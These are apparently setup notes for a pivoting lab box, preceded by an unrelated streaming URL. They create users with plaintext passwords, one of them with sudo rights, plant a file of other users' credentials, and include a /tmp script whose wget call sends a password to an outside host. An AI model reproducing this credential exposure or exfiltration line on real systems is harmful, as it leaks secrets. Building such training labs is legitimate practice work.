https://flixtor.watch/episodes/yellowstone-season-3-episode-6/

## pivot-1

useradd -U -m -s /bin/bash t.chaz1
useradd -U -m -s /bin/bash j.river
useradd -U -m -s /bin/bash b.thomas
useradd -G sudo -U -m -s /bin/bash r.bean

echo -e "eyeheartmyjobmostofthetime\neyeheartmyjobmostofthetime" | passwd t.chaz1
echo -e "whyarthouhankingatme\nwhyarthouhankingatme" | passwd j.river
echo -e "ducklingsaretasty\nducklingsaretasty" | passwd b.thomasexit

echo -e "hashtagfreelittlepeepfam\nhashtagfreelittlepeepfam" | passwd r.bean

t.chaz1 : eyeheartmyjobmostofthetime
j.river : whyarthouhankingatme
b.thomas: ducklingsaretasty
r.bean : hashtagfreelittlepeepfam 


- User account statuses.txt text file in t.chaz1 (Other users on the system)
j.river : whyarthouhankingatme
b.thomas : ducklingsaretasty
	
- Script in /tmp
#/bin/bash
   
pass="hashtagfreelittlepeepfam" 
   
wget https://old.reddit.com/u?creds=$pass

 echo -e "j.river : whyarthouhankingatme\nb.thomas : ducklingsaretasty" > /home/t.chaz1/user_statuses.txt
 chown t.chaz1:t.chaz1 /home/t.chaz1/user_statuses.txt



## pivot-2
